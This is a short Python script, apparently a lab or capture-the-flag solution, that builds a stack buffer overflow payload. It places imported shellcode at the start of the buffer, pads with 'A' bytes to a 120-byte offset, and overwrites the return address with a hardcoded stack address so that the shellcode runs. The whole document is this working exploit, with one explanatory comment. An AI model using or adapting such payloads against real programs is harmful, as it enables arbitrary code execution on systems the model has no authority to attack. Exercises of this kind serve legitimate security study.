#!/usr/bin/env python3

import sys

from shellcode import shellcode
buf_addr = 0x7ffffff6b460  
offset = 120

payload = shellcode 
payload += b'A' * (offset - len(shellcode)) #distance to the return address in memory fill with padding
payload += buf_addr.to_bytes(8, 'little')

sys.stdout.buffer.write(payload)
